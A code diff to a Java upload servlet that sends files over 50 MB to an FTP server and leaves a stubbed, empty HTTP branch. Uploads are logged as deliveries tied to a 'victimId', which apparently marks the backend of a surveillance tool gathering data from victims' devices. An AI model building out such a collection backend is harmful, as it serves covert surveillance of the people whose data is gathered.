@@ -26,6 +26,9 @@ import java.io.IOException;
 public class UploadServlet extends AdvancedBaseServlet {
 
 
+    private static final String KEY_FILE = "file";
+    private static final int FTP_THRESHOLD_IN_MB = 50;
+
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         setGETMethodNotSupported(resp);
@@ -64,35 +67,45 @@ public class UploadServlet extends AdvancedBaseServlet {
 
         if (!hasError) {
 
+
             //Yes,it's a valid data type
-            final Part dataFilePart = getHttpServletRequest().getPart(KEY_DATA);
+            final Part dataFilePart = getHttpServletRequest().getPart(KEY_FILE);
 
             if (dataFilePart != null) {
 
-                final FilePart filePart = new FilePart(dataFilePart);
-                final String fileName = filePart.getRandomFileName();
+                final float sizeInMb = (float) (dataFilePart.getSize() / 1024) / 1024;
 
-                final Server ftpServer = Servers.getInstance().getLeastUsedServer();
-                final FTPClient ftpClient = new FTPClient();
+                if (sizeInMb > FTP_THRESHOLD_IN_MB) {
+                    //Use FTP to upload the file.
 
-                ftpClient.connect(ftpServer.getFtpDomain());
-                ftpClient.login(ftpServer.getFtpUsername(), ftpServer.getFtpPassword());
+                    final FilePart filePart = new FilePart(dataFilePart);
+                    final String fileName = filePart.getRandomFileName();
 
-                System.out.println("File uploading...");
+                    final Server ftpServer = Servers.getInstance().getLeastUsedServer();
+                    final FTPClient ftpClient = new FTPClient();
 
-                ftpClient.storeFile(ftpServer.getFolderToSave() + "/" + fileName, dataFilePart.getInputStream());
+                    ftpClient.connect(ftpServer.getFtpDomain());
+                    ftpClient.login(ftpServer.getFtpUsername(), ftpServer.getFtpPassword());
 
-                final String downloadLink = String.format("http://%s%s", ftpServer.getFtpDomain(), fileName);
+                    System.out.println("File uploading...");
 
-                System.out.println("File uploaded");
+                    ftpClient.storeFile(ftpServer.getFolderToSave() + "/" + fileName, dataFilePart.getInputStream());
 
-                ftpClient.logout();
+                    final String downloadLink = String.format("http://%s%s", ftpServer.getFtpDomain(), fileName);
 
-                //Success message
-                getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());
+                    System.out.println("File uploaded");
 
-                //What ever the data_type, adding delivery;
-                deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));
+                    ftpClient.logout();
+
+                    //Success message
+                    getWriter().write(new APIResponse("File uploaded", Media.COLUMN_DOWNLOAD_LINK, downloadLink).getResponse());
+
+                    //What ever the data_type, adding delivery;
+                    deliveries.addv2(new Delivery(victimId, false, message, dataType, -1));
+
+                } else {
+                    //Use direct HTTP
+                }
 
             } else {
                 final String errorMessage = KEY_DATA + " is missing";
